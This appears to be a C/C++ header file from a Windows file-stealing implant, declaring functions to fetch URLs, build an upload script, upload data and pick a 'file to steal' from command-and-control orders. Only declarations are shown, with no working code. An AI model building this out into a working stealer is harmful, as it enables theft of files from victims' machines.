
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>
#include <wininet.h>
#include <shellapi.h>
#include <iostream>


using namespace std;
#pragma once
int CreateUploadScript();
int GetUrlOverHttp(char *szUrl, char *szDst);
int UploadFile(std::string data);
string GetFileToSteal(char* c2OrdersPath);